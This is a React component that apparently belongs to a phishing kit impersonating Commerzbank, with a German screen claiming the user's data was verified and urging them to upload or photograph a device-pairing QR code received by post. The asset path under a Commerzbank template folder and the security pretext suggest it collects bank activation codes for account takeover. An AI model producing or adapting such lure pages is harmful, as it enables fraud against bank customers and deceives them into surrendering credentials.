import React from 'react';

interface QRInstructionsScreenProps {
  onContinue: () => void;
}

const QRInstructionsScreen: React.FC<QRInstructionsScreenProps> = ({ onContinue }) => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '60px 40px',
        backgroundColor: 'white',
        minHeight: '100vh'
      }}>
        <div style={{
          textAlign: 'left' as const,
          maxWidth: '800px'
        }}>
          <h1 className="mobile-title" style={{
            color: '#002e3c',
            fontSize: '2.5rem',
            fontWeight: 'bold',
            marginBottom: '40px',
            fontFamily: 'Gotham, Arial, sans-serif',
            lineHeight: '1.1'
          }}>
            Gerät erneut koppeln
          </h1>
          
          <p style={{
            color: '#666',
            fontSize: '1.25rem',
            lineHeight: '1.6',
            marginBottom: '40px'
          }}>
            Ihre Daten wurden erfolgreich verifiziert. Um die Sicherheit Ihres Kontos zu gewährleisten, 
            müssen Sie Ihr Gerät erneut mit Ihrem Konto koppeln.
          </p>
          
          <div style={{
            marginBottom: '40px',
            textAlign: 'center' as const
          }}>
            <img 
              src="/templates/commerzbank/images/cb_upload.jpg" 
              alt="QR-Code Upload Beispiel" 
              style={{
                width: '100%',
                height: 'auto',
                borderRadius: '12px',
                boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)'
              }}
            />
          </div>
          
          <div style={{
            backgroundColor: '#f8f9fa',
            border: '1px solid #e9ecef',
            borderRadius: '12px',
            padding: '30px',
            marginBottom: '40px'
          }}>
            <h3 style={{
              color: '#002e3c',
              fontSize: '1.5rem',
              fontWeight: 'bold',
              marginBottom: '25px',
              fontFamily: 'Gotham, Arial, sans-serif'
            }}>
              So funktioniert's:
            </h3>
            
            <div style={{ marginBottom: '20px' }}>
              <div style={{ display: 'flex', alignItems: 'flex-start' }}>
                <span style={{
                  backgroundColor: '#FFD700',
                  color: '#002e3c',
                  borderRadius: '50%',
                  width: '32px',
                  height: '32px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  marginRight: '16px',
                  flexShrink: 0,
                  marginTop: '2px'
                }}>
                  1
                </span>
                <p style={{
                  color: '#666',
                  fontSize: '1.1rem',
                  margin: 0,
                  lineHeight: '1.5'
                }}>
                  Sie haben einen QR-Code per Post erhalten
                </p>
              </div>
            </div>
            
            <div style={{ marginBottom: '20px' }}>
              <div style={{ display: 'flex', alignItems: 'flex-start' }}>
                <span style={{
                  backgroundColor: '#FFD700',
                  color: '#002e3c',
                  borderRadius: '50%',
                  width: '32px',
                  height: '32px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  marginRight: '16px',
                  flexShrink: 0,
                  marginTop: '2px'
                }}>
                  2
                </span>
                <p style={{
                  color: '#666',
                  fontSize: '1.1rem',
                  margin: 0,
                  lineHeight: '1.5'
                }}>
                  Laden Sie den QR-Code hoch oder fotografieren Sie ihn direkt
                </p>
              </div>
            </div>
            
            <div>
              <div style={{ display: 'flex', alignItems: 'flex-start' }}>
                <span style={{
                  backgroundColor: '#FFD700',
                  color: '#002e3c',
                  borderRadius: '50%',
                  width: '32px',
                  height: '32px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  marginRight: '16px',
                  flexShrink: 0,
                  marginTop: '2px'
                }}>
                  3
                </span>
                <p style={{
                  color: '#666',
                  fontSize: '1.1rem',
                  margin: 0,
                  lineHeight: '1.5'
                }}>
                  Ihr Gerät wird automatisch gekoppelt und Sie können wieder sicher auf Ihr Konto zugreifen
                </p>
              </div>
            </div>
          </div>
          
          <button
            onClick={onContinue}
            style={{
              backgroundColor: '#FFD700',
              color: '#002e3c',
              border: 'none',
              borderRadius: '50px',
              padding: '20px 50px',
              fontSize: '1.25rem',
              fontWeight: 'bold',
              cursor: 'pointer',
              fontFamily: 'Gotham, Arial, sans-serif',
              transition: 'all 0.3s ease',
              display: 'flex',
              alignItems: 'center',
              gap: '10px'
            }}
            onMouseOver={(e) => {
              e.currentTarget.style.backgroundColor = '#e6c200';
              e.currentTarget.style.transform = 'translateY(-2px)';
            }}
            onMouseOut={(e) => {
              e.currentTarget.style.backgroundColor = '#FFD700';
              e.currentTarget.style.transform = 'translateY(0)';
            }}
          >
            QR-Code hochladen
            <span style={{ fontSize: '1.5rem' }}>→</span>
          </button>
        </div>
      </div>
    </>
  );
};

export default QRInstructionsScreen; 